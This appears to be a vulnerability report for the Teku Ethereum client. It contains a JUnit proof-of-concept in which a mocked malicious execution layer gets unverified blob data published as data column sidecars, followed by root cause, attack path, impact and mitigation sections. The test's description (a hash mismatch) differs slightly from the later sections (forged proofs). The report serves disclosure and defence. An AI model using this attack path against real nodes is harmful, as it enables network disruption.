/*
 * VULNERABILITY DESCRIPTION:
 * FULU-DISTRIBUTED-BLOB-PUBLISHING trust-boundary violation. The DBP recovery path validates only
 * the number of BlobAndCellProofs returned by the EL and never verifies that the blob payloads
 * correspond to the requested versioned hashes. Malicious or buggy EL responses can therefore be
 * published as legitimate data column sidecars.
 *
 * LOCATION:
 * ethereum/statetransition/src/main/java/tech/pegasys/teku/statetransition/datacolumns/util/DataColumnSidecarELRecoveryManagerImpl.java
 *
 * TEST STATUS: pass_when_exploitable
 * BUILD STATUS: passed
 */
public class PocFuluDistributedBlobPublishingContentMismatchTest {

  private final Spec spec = TestSpecFactory.createMinimalFulu();
  private final DataStructureUtil dataStructureUtil = new DataStructureUtil(spec);
  private final StubAsyncRunner asyncRunner = new StubAsyncRunner();
  private final RecentChainData recentChainData = mock(RecentChainData.class);
  private final ExecutionLayerChannel executionLayer = mock(ExecutionLayerChannel.class);
  private final KZG kzg = mock(KZG.class);
  private final CustodyGroupCountManager custodyGroupCountManager =
      createCustodyGroupCountManager(4, 8);
  private final Supplier<CustodyGroupCountManager> custodyGroupCountManagerSupplier =
      () -> custodyGroupCountManager;

  @SuppressWarnings("unchecked")
  private final Consumer<List<DataColumnSidecar>> dataColumnSidecarPublisher = mock(Consumer.class);

  private final TimeProvider timeProvider = StubTimeProvider.withTimeInMillis(ZERO);
  private final DataColumnSidecarELRecoveryManagerImpl dataColumnSidecarELRecoveryManager =
      new DataColumnSidecarELRecoveryManagerImpl(
          spec,
          asyncRunner,
          recentChainData,
          executionLayer,
          UInt64.valueOf(320),
          FutureItems.DEFAULT_FUTURE_SLOT_TOLERANCE,
          10,
          kzg,
          dataColumnSidecarPublisher,
          custodyGroupCountManagerSupplier,
          new StubMetricsSystem(),
          timeProvider,
          Duration.ofMillis(500),
          3);

  private UInt64 currentSlot = UInt64.valueOf(10);

  @BeforeEach
  void setup() {
    when(kzg.computeCells(any()))
        .thenReturn(IntStream.range(0, 128).mapToObj(__ -> new KZGCell(Bytes.random(2048))).toList());
    when(recentChainData.computeTimeAtSlot(any())).thenReturn(UInt64.ZERO);
    setSlot(currentSlot);
  }

  private void setSlot(final UInt64 slot) {
    currentSlot = slot;
    dataColumnSidecarELRecoveryManager.onSlot(slot);
  }

  @Test
  @SuppressWarnings("unchecked")
  public void poc_fulu_distributed_blob_publishing_content_mismatch() {
    reset(executionLayer, dataColumnSidecarPublisher);

    final SignedBeaconBlock block = dataStructureUtil.randomSignedBeaconBlock(currentSlot.longValue());
    final List<BlobSidecar> blobSidecars = dataStructureUtil.randomBlobSidecarsForBlock(block);

    // Attack scenario: a malicious Execution Layer fulfils the
    // requested count of BlobAndCellProofs but swaps in different blob payloads that no longer match
    // the versioned hashes recorded in DataColumnSidecarELRecoveryManagerImpl.
    final List<BlobAndCellProofs> mismatchedBlobAndCellProofs =
        blobSidecars.stream()
            .map(
                blobSidecar -> {
                  Blob mutatedBlob = dataStructureUtil.randomValidBlob();
                  while (mutatedBlob.equals(blobSidecar.getBlob())) {
                    mutatedBlob = dataStructureUtil.randomValidBlob();
                  }
                  assertThat(mutatedBlob).isNotEqualTo(blobSidecar.getBlob());

                  final List<KZGProof> cellProofs =
                      IntStream.range(0, 128)
                          .mapToObj(__ -> dataStructureUtil.randomKZGProof())
                          .toList();

                  return new BlobAndCellProofs(mutatedBlob, cellProofs);
                })
            .toList();

    // Attack step: attacker waits until node schedules EL recovery for the targeted slot.
    dataColumnSidecarELRecoveryManager.onSlot(currentSlot);
    // Attack step: malicious payload is injected when the block enters the recovery queue.
    dataColumnSidecarELRecoveryManager.onNewBlock(block, Optional.empty());

    // Attack prerequisites: node derives the versioned hashes that should anchor the blob contents.
    final List<VersionedHash> versionedHashes = getVersionedHashesFromBlock(block);
    // Attack step: EL response returns mutated blobs tied to legitimate versioned-hash requests.
    when(executionLayer.engineGetBlobAndCellProofsList(versionedHashes, currentSlot))
        .thenReturn(SafeFuture.completedFuture(mismatchedBlobAndCellProofs));

    // Attack scenario step: the recovery manager performs only the size check (lines 420-424) and
    // proceeds to publishRecoveredDataColumnSidecars, pushing the tampered blobs to gossip without
    // any cryptographic verification against the original commitments.
    asyncRunner.executeQueuedActions();

    // Attack trace validation: confirm the malicious EL interaction was invoked.
    verify(executionLayer, atLeastOnce()).engineGetBlobAndCellProofsList(versionedHashes, currentSlot);

    final ArgumentCaptor<List<DataColumnSidecar>> sidecarsCaptor = ArgumentCaptor.forClass(List.class);
    // Attack completion: forged sidecars are published to the custody subnets.
    verify(dataColumnSidecarPublisher).accept(sidecarsCaptor.capture());
    assertThat(sidecarsCaptor.getValue().size())
        .isEqualTo(custodyGroupCountManager.getSamplingGroupCount());
  }

  private List<VersionedHash> getVersionedHashesFromBlock(final SignedBeaconBlock block) {
    final SlotAndBlockRoot slotAndBlockRoot = block.getSlotAndBlockRoot();
    final DataColumnSidecarELRecoveryManagerImpl.RecoveryTask recoveryTask =
        dataColumnSidecarELRecoveryManager.getRecoveryTask(slotAndBlockRoot);

    if (recoveryTask == null) {
      throw new IllegalStateException("No recovery task found for block");
    }

    final SszList<SszKZGCommitment> sszKZGCommitments = recoveryTask.sszKZGCommitments();
    final List<BlobIdentifier> blobIdentifiers =
        IntStream.range(0, sszKZGCommitments.size())
            .mapToObj(
                index -> new BlobIdentifier(slotAndBlockRoot.getBlockRoot(), UInt64.valueOf(index)))
            .toList();

    final SpecVersion specVersion = spec.atSlot(slotAndBlockRoot.getSlot());
    final MiscHelpersDeneb miscHelpersDeneb =
        specVersion.miscHelpers().toVersionDeneb().orElseThrow();

    return blobIdentifiers.stream()
        .map(
            blobIdentifier ->
                miscHelpersDeneb.kzgCommitmentToVersionedHash(
                    sszKZGCommitments.get(blobIdentifier.getIndex().intValue()).getKZGCommitment()))
        .toList();
  }
}
```

### Mitigation

Recompute each returned blob's versioned hash (or directly verify the KZG commitment) before constructing sidecars, and reject any `BlobAndCellProofs` entry whose hash does not match the requested slot/index. As a defense-in-depth measure, reuse the existing `DataColumnSidecarGossipValidator` on the constructed objects before publishing them to gossip.

### Summary

The missing DataColumnSidecarGossipValidator check in DataColumnSidecarELRecoveryManagerImpl.publishRecoveredDataColumnSidecars() will cause forged data column sidecars to be broadcast for honest Teku peers as a compromised Execution Layer submits duplicate KZG proofs through the DBP recovery path.


### Root Cause

In ethereum/statetransition/src/main/java/tech/pegasys/teku/statetransition/datacolumns/util/DataColumnSidecarELRecoveryManagerImpl.java::publishRecoveredDataColumnSidecars the DBP recovery path publishes constructed DataColumnSidecar objects without passing them through DataColumnSidecarGossipValidator, enabling malformed proofs to bypass structural and KZG validation before gossip.


### Internal Pre-conditions

1. [Teku node must schedule Distributed Blob Publishing recovery for a Fulu block] RecoveryTask is created via onNewBlock() for a slot at or after the Fulu fork with missing blob sidecars.
2. [Async runner must drain the recovery queue] StubAsyncRunner.executeQueuedActions() (or the production async runner) executes the publishRecoveredDataColumnSidecars() task for that RecoveryTask.

### External Pre-conditions

1. [Compromised Execution Layer responds to engineGetBlobAndCellProofsList()] The EL controlled by the attacker returns blobAndCellProofs whose proof entries are forged or duplicated while still matching the expected list size.
2. [Peer network remains connected to the Teku publisher] Gossip peers accept the outbound DBP publication without prior validation and rely on Teku to have performed the checks.

### Attack Path

1. Attacker-controlled EL returns BlobAndCellProofs containing forged KZG proofs when DataColumnSidecarELRecoveryManagerImpl.fetchMissingBlobsFromLocalEL() requests data for the queued block.
2. publishRecoveredDataColumnSidecars() constructs DataColumnSidecar objects directly from the forged payload.
3. The method skips DataColumnSidecarGossipValidator and invokes dataColumnSidecarPublisher.accept(), pushing malformed sidecars onto gossip subnets.

### Impact

DBP routes can publish without performing gossip-equivalent verification, causing peers to discard them upon receipt. This wastes bandwidth and CPU resources while imposing unnecessary load on local custody sampling and recovery processes. While it does not involve fund risk or finality compromise, it contributes to DoS attacks and reduced operational health.

